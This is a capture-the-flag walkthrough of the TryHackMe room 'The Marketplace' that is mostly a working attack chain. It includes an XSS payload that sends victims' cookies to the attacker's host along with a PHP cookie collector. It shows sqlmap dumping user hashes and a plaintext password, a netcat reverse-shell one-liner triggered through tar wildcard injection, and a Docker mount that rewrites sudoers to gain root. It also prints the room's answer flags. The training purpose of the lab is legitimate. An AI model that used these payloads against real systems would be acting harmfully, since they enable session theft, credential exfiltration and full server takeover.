# The Marketplace

Can you take over The Marketplace's infrastructure?

[The Marketplace](https://tryhackme.com/room/marketplace)

## Topic's

- Network Enumeration
- Web Enumeration
- Web Cookie Manipulation
- SQL Enumeration
- Misconfigured Binaries
- Exploitation Docker

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 The Marketplace

The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?

```
kali@kali:~/CTFs/tryhackme/The Marketplace$ sudo nmap -A -sS -sC -sV -O 10.10.225.14
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-24 13:04 CEST
Nmap scan report for 10.10.225.14
Host is up (0.041s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c8:3c:c5:62:65:eb:7f:5d:92:24:e9:3b:11:b5:23:b9 (RSA)
|   256 06:b7:99:94:0b:09:14:39:e1:7f:bf:c7:5f:99:d3:9f (ECDSA)
|_  256 0a:75:be:a2:60:c6:2b:8a:df:4f:45:71:61:ab:60:b7 (ED25519)
80/tcp    open  http    nginx 1.19.2
| http-robots.txt: 1 disallowed entry
|_/admin
|_http-server-header: nginx/1.19.2
|_http-title: The Marketplace
32768/tcp open  http    Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry
|_/admin
|_http-title: The Marketplace
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.32 - 3.1 (86%), Linux 2.6.39 - 3.2 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   40.97 ms 10.8.0.1
2   41.19 ms 10.10.225.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.60 seconds
```

```
kali@kali:~/CTFs/tryhackme/The Marketplace$ gobuster dir -u http://10.10.225.14 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.225.14
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/24 13:08:05 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/admin (Status: 403)
/Admin (Status: 403)
/ADMIN (Status: 403)
/images (Status: 301)
/login (Status: 200)
/Login (Status: 200)
/messages (Status: 302)
/new (Status: 302)
/robots.txt (Status: 200)
/signup (Status: 200)
/stylesheets (Status: 301)
===============================================================
2020/10/24 13:08:26 Finished
===============================================================
```

```php
<?php
    header('Location: http://10.10.225.14/admin');

    if (isset($_GET['c'])) {
        $cookie = $_GET['c'];
        $file = fopen('cookie.txt', 'a+');
        fwrite($file, $cookie);
    }
?>
```

```html
<script type="text/javascript">
  document.location =
    "http://10.8.106.222/thief/index.php?c=" + document.cookie;
</script>
```

```
kali@kali:~/CTFs/tryhackme/The Marketplace$ service apache2 start
kali@kali:~/CTFs/tryhackme/The Marketplace$ cd /var/www/html/
kali@kali:/var/www/html$ sudo mkdir thief
kali@kali:/var/www/html$ cd thief/
kali@kali:/var/www/html/thief$ ls
index.php
```

```
kali@kali:/var/www/html/thief$ cat cookie.txt
token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM1NDAyNTl9.uwhuYwdbVykf0R_jiUVO0ITbgzhKXU_KxeYkPL4mWx4
```

![](./2020-10-24_13-52.png)

![](./2020-10-24_14-03.png)

```
kali@kali:~/CTFs/tryhackme/The Marketplace$ sqlmap -r r.txt --technique=U --dbms=mysql --delay=3
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:20:02 /2020-10-24/

[14:20:02] [INFO] parsing HTTP request from 'r.txt'
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]
[14:20:05] [INFO] testing connection to the target URL
[14:20:08] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:20:15] [INFO] heuristic (basic) test shows that GET parameter 'user' might be injectable (possible DBMS: 'MySQL')
[14:20:18] [INFO] testing for SQL injection on GET parameter 'user'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]
[14:20:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[14:20:27] [WARNING] reflective value(s) found and filtering out
[14:20:33] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:20:45] [INFO] target URL appears to have 4 columns in query
[14:21:13] [INFO] GET parameter 'user' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[14:21:13] [INFO] checking if the injection point on GET parameter 'user' is a false positive
GET parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 23 HTTP(s) requests:
---
Parameter: user (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=-9682 UNION ALL SELECT NULL,CONCAT(0x71707a6b71,0x6f615855645746416c77565742566c6c6c5456656f447562594f786e556f53785071696e73674b7a,0x717a767071),NULL,NULL-- -
---
[14:21:43] [INFO] testing MySQL
[14:21:46] [INFO] confirming MySQL
[14:21:52] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 8.0.0
[14:22:08] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 9 times
[14:22:08] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.225.14'

[*] ending @ 14:22:08 /2020-10-24/
```

```
kali@kali:~/CTFs/tryhackme/The Marketplace$ sqlmap -r r.txt --current-db
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.9#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:22:54 /2020-10-24/

[14:22:54] [INFO] parsing HTTP request from 'r.txt'
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]
[14:22:55] [INFO] resuming back-end DBMS 'mysql'
[14:22:55] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=-9682 UNION ALL SELECT NULL,CONCAT(0x71707a6b71,0x6f615855645746416c77565742566c6c6c5456656f447562594f786e556f53785071696e73674b7a,0x717a767071),NULL,NULL-- -
---
[14:22:56] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 8
[14:22:56] [INFO] fetching current database
current database: 'marketplace'
[14:22:56] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.225.14'

[*] ending @ 14:22:56 /2020-10-24/
```

```
kali@kali:~/CTFs/tryhackme/The Marketplace$ sqlmap -r r.txt -D marketplace --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:23:48 /2020-10-24/

[14:23:48] [INFO] parsing HTTP request from 'r.txt'
Cookie parameter 'token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N]
[14:23:51] [INFO] resuming back-end DBMS 'mysql'
[14:23:51] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: user=-9682 UNION ALL SELECT NULL,CONCAT(0x71707a6b71,0x6f615855645746416c77565742566c6c6c5456656f447562594f786e556f53785071696e73674b7a,0x717a767071),NULL,NULL-- -
---
[14:23:51] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 8
[14:23:51] [INFO] fetching tables for database: 'marketplace'
[14:23:52] [INFO] retrieved: 'items'
[14:23:52] [INFO] retrieved: 'messages'
[14:23:52] [INFO] retrieved: 'users'
[14:23:52] [INFO] fetching columns for table 'items' in database 'marketplace'
[14:23:52] [INFO] retrieved: 'author','int'
[14:23:52] [INFO] retrieved: 'description','varchar(256)'
[14:23:52] [INFO] retrieved: 'id','int'
[14:23:52] [INFO] retrieved: 'image','varchar(64)'
[14:23:52] [INFO] retrieved: 'title','text'
[14:23:52] [INFO] fetching entries for table 'items' in database 'marketplace'
[14:23:53] [INFO] retrieved: '2','Good as new. ','1','867a9d1a2edc2995dca4b13de50fc545','Dell Laptop'
[14:23:53] [INFO] retrieved: '3','Yep, that's a cactus.','2','abffe546fb4cb740cc6b44f9e4c263df','A cactus'
[14:23:53] [INFO] retrieved: '4','<script type="text/javascript">document.location='http://10.8.106.222/cookie_thief.php?c='+document.cookie;</script>','3','598815c0f5554115631a3250e5...
[14:23:53] [INFO] retrieved: '4','<script type="text/javascript">document.location='http://10.8.106.222/thief/?c='+document.cookie;</script>','4','598815c0f5554115631a3250e5db1719','t...
[14:23:53] [INFO] retrieved: '4','<script type="text/javascript">document.location='http://10.8.106.222/thief/?c='+document.cookie;</script>','5','598815c0f5554115631a3250e5db1719','p...
[14:23:53] [INFO] retrieved: '4','asd','6','598815c0f5554115631a3250e5db1719','asd'
[14:23:53] [INFO] retrieved: '4','<script type="text/javascript">document.location='http://10.8.106.222/thief/?c='+document.cookie;</script>','7','598815c0f5554115631a3250e5db1719','asd'
[14:23:53] [INFO] retrieved: '4','<script type="text/javascript">document.location='http://10.8.106.222/thief/?c='+document.cookie;</script>','8','598815c0f5554115631a3250e5db1719','c...
[14:23:53] [INFO] recognized possible password hashes in column 'image'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N]
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[14:24:05] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[14:24:15] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N]
[14:24:19] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[14:24:19] [INFO] starting 2 processes
[14:25:13] [WARNING] no clear password(s) found
Database: marketplace
Table: items
[8 entries]
+----+----------------------------------+----------------+--------+----------------------------------------------------------------------------------------------------------------------+
| id | image                            | title          | author | description                                                                                                          |
+----+----------------------------------+----------------+--------+----------------------------------------------------------------------------------------------------------------------+
| 1  | 867a9d1a2edc2995dca4b13de50fc545 | Dell Laptop    | 2      | Good as new.                                                                                                         |
| 2  | abffe546fb4cb740cc6b44f9e4c263df | A cactus       | 3      | Yep, that's a cactus.                                                                                                |
| 3  | 598815c0f5554115631a3250e5db1719 | test           | 4      | <script type="text/javascript">document.location='http://10.8.106.222/cookie_thief.php?c='+document.cookie;</script> |
| 4  | 598815c0f5554115631a3250e5db1719 | test           | 4      | <script type="text/javascript">document.location='http://10.8.106.222/thief/?c='+document.cookie;</script>           |
| 5  | 598815c0f5554115631a3250e5db1719 | pleas click me | 4      | <script type="text/javascript">document.location='http://10.8.106.222/thief/?c='+document.cookie;</script>           |
| 6  | 598815c0f5554115631a3250e5db1719 | asd            | 4      | asd                                                                                                                  |
| 7  | 598815c0f5554115631a3250e5db1719 | asd            | 4      | <script type="text/javascript">document.location='http://10.8.106.222/thief/?c='+document.cookie;</script>           |
| 8  | 598815c0f5554115631a3250e5db1719 | click          | 4      | <script type="text/javascript">document.location='http://10.8.106.222/thief/?c='+document.cookie;</script>           |
+----+----------------------------------+----------------+--------+----------------------------------------------------------------------------------------------------------------------+

[14:25:13] [INFO] table 'marketplace.items' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.225.14/dump/marketplace/items.csv'
[14:25:13] [INFO] fetching columns for table 'users' in database 'marketplace'
[14:25:13] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[14:25:14] [INFO] retrieved: 'id','int'
[14:25:14] [INFO] retrieved: 'isAdministrator','tinyint(1)'
[14:25:14] [INFO] retrieved: 'password','varchar(128)'
[14:25:14] [INFO] retrieved: 'username','varchar(32)'
[14:25:14] [INFO] fetching entries for table 'users' in database 'marketplace'
[14:25:14] [INFO] retrieved: '1','0','$2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW','system'
[14:25:14] [INFO] retrieved: '2','1','$2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q','michael'
[14:25:14] [INFO] retrieved: '3','1','$2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG','jake'
[14:25:14] [INFO] retrieved: '4','0','$2b$10$WuQs1eVOu4AOwaZjmxiLWOv.PLBAHP5AgwQzNfGVKQeAjWPcxtoyG','test'
Database: marketplace
Table: users
[4 entries]
+----+--------------------------------------------------------------+----------+-----------------+
| id | password                                                     | username | isAdministrator |
+----+--------------------------------------------------------------+----------+-----------------+
| 1  | $2b$10$83pRYaR/d4ZWJVEex.lxu.Xs1a/TNDBWIUmB4z.R0DT0MSGIGzsgW | system   | 0               |
| 2  | $2b$10$yaYKN53QQ6ZvPzHGAlmqiOwGt8DXLAO5u2844yUlvu2EXwQDGf/1q | michael  | 1               |
| 3  | $2b$10$/DkSlJB4L85SCNhS.IxcfeNpEBn.VkyLvQ2Tk9p2SDsiVcCRb4ukG | jake     | 1               |
| 4  | $2b$10$WuQs1eVOu4AOwaZjmxiLWOv.PLBAHP5AgwQzNfGVKQeAjWPcxtoyG | test     | 0               |
+----+--------------------------------------------------------------+----------+-----------------+

[14:25:14] [INFO] table 'marketplace.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.225.14/dump/marketplace/users.csv'
[14:25:14] [INFO] fetching columns for table 'messages' in database 'marketplace'
[14:25:14] [INFO] retrieved: 'id','int'
[14:25:14] [INFO] retrieved: 'is_read','tinyint(1)'
[14:25:14] [INFO] retrieved: 'message_content','varchar(1024)'
[14:25:14] [INFO] retrieved: 'user_from','int'
[14:25:14] [INFO] retrieved: 'user_to','int'
[14:25:14] [INFO] fetching entries for table 'messages' in database 'marketplace'
[14:25:15] [INFO] retrieved: '1','1','Hello!\r\nAn automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary passwor...
[14:25:15] [INFO] retrieved: '2','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via pr...
[14:25:15] [INFO] retrieved: '3','1','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'
[14:25:15] [INFO] retrieved: '4','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via pr...
[14:25:15] [INFO] retrieved: '5','1','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'
[14:25:15] [INFO] retrieved: '6','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via pr...
[14:25:15] [INFO] retrieved: '7','1','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'
[14:25:15] [INFO] retrieved: '8','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via pr...
[14:25:15] [INFO] retrieved: '9','1','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'
[14:25:15] [INFO] retrieved: '10','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via p...
[14:25:15] [INFO] retrieved: '11','1','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'
[14:25:15] [INFO] retrieved: '12','1','Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via p...
[14:25:15] [INFO] retrieved: '13','0','Thank you for your report. We have reviewed the listing and found nothing that violates our rules.','1','4'
Database: marketplace
Table: messages
[13 entries]
+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | is_read | user_to | user_from | message_content                                                                                                                                                                                   |
+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | 1       | 3       | 1         | Hello!\r\nAn automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.\r\nYour new password is: @b_ENXkGYUCAv3zJ     |
| 2  | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 3  | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 4  | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 5  | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 6  | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 7  | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 8  | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 9  | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 10 | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 11 | 1       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
| 12 | 1       | 4       | 1         | Thank you for your report. One of our admins will evaluate whether the listing you reported breaks our guidelines and will get back to you via private message. Thanks for using The Marketplace! |
| 13 | 0       | 4       | 1         | Thank you for your report. We have reviewed the listing and found nothing that violates our rules.                                                                                                |
+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[14:25:16] [INFO] table 'marketplace.messages' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.225.14/dump/marketplace/messages.csv'
[14:25:16] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.225.14'

[*] ending @ 14:25:16 /2020-10-24/
```

`@b_ENXkGYUCAv3zJ`

```
kali@kali:~/CTFs/tryhackme/The Marketplace$ ssh jake@10.10.225.14
The authenticity of host '10.10.225.14 (10.10.225.14)' can't be established.
ECDSA key fingerprint is SHA256:nRz0NCvN/WNh5cE3/dccxy42AXrwcJInG2n8nBWtNtg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.225.14' (ECDSA) to the list of known hosts.
jake@10.10.225.14's password:
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 24 12:27:45 UTC 2020

  System load:  0.09               Users logged in:                0
  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.225.14
  Memory usage: 29%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1
  Processes:    96

  => / is using 87.1% of 14.70GB


20 packages can be updated.
0 updates are security updates.


jake@the-marketplace:~$ ls
user.txt
jake@the-marketplace:~$ cat user.txt
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```

```
jake@the-marketplace:~$ sudo -l
Matching Defaults entries for jake on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh
jake@the-marketplace:~$ cat /opt/backups/backup.sh
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *
```

```
jake@the-marketplace:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f" > shell.sh
jake@the-marketplace:~$ echo "" > "--checkpoint-action=exec=sh shell.sh"
jake@the-marketplace:~$ echo "" > --checkpoint=1
jake@the-marketplace:~$ rm /opt/backups/backup.tar
jake@the-marketplace:~$ sudo -u michael /opt/backups/backup.sh
Backing up files...
tar: user.txt: Cannot open: Permission denied
rm: cannot remove '/tmp/f': No such file or directory
```

```
kali@kali:~/CTFs/tryhackme/The Marketplace$ nc -lnvp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.225.14 40874
$ whoami
michael
$
```

```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDO7GTxIFv/SEVqelwR1OrCvcDRsaOYuyU3JtdaFxv1IPMxp8soS007K9eeQyZvpSiU7ynIhwJsSrfhPH9PWvpPF937Ppe8+LX5e5b+5FsFMoVw6dkwWW2fNImlDcXf273vD/7bTRB+SBo+UcBuIR31ERpM+90xCNKv+HERbiq1TznnBZXJ16Pxu2VBfSCLF4ZjPO4BFG62IQQmkK1e3v3CeiF2b8t+lbS2LrUCbLKdPYvhH6rzoz1LoPwvNOryTivgjDhs/xGFBY3RThAKBiLJXTOAx4qLf4FMEo0Cr8y6GBz3mtLj/UJzNctwllvj4NwVgDpoTqt1EsMA+d1BQYlO5XF4CmhGbKyQamvgrXzdAUKgE1sZ1oel84A3POCrOGJdngPRM9EkUWI9H6619SVmohjukRfWRbMQaUz1mxCz8SUDJlGZWs9kJgKec/LqgjyJxH6VV3ArOKMdoaRQ3BNwHMVmONWFZVOvj+QzXtSWd+ubAdO4HdNwv/ehUj86Qzs= kali@kali" > authorized_keys
```

```
kali@kali:~/CTFs/tryhackme/The Marketplace$ ssh -i ~/.ssh/id_rsa michael@10.10.225.14
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 24 12:40:40 UTC 2020

  System load:  0.0                Users logged in:                1
  Usage of /:   87.1% of 14.70GB   IP address for eth0:            10.10.225.14
  Memory usage: 29%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-636b40a4e2d6: 172.18.0.1
  Processes:    110

  => / is using 87.1% of 14.70GB


20 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

michael@the-marketplace:~$
```

```
michael@the-marketplace:~$ id
uid=1002(michael) gid=1002(michael) groups=1002(michael),999(docker)
```

```
michael@the-marketplace:~$ docker run -v /etc:/mnt -it --rm alpine /bin/ash
/ # cd /mnt
/mnt # echo "michael ALL=(ALL) NOPASSWD:ALL" >> sudoers
/mnt # cat sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
jake ALL=(michael) NOPASSWD: /opt/backups/backup.sh
michael ALL=(ALL) NOPASSWD:ALL
/mnt # exit
michael@the-marketplace:~$ sudo -l
Matching Defaults entries for michael on the-marketplace:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User michael may run the following commands on the-marketplace:
    (ALL) NOPASSWD: ALL
michael@the-marketplace:~$ sudo su
root@the-marketplace:/home/michael# cd /root
root@the-marketplace:~# ls
root.txt
root@the-marketplace:~# cat root.txt
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```

1. What is flag 1?

`THM{c37a63895910e478f28669b048c348d5}`

2. What is flag 2? (User.txt)

`THM{c3648ee7af1369676e3e4b15da6dc0b4}`

3. What is flag 3? (Root.txt)

`THM{d4f76179c80c0dcf46e0f8e43c9abd62}`
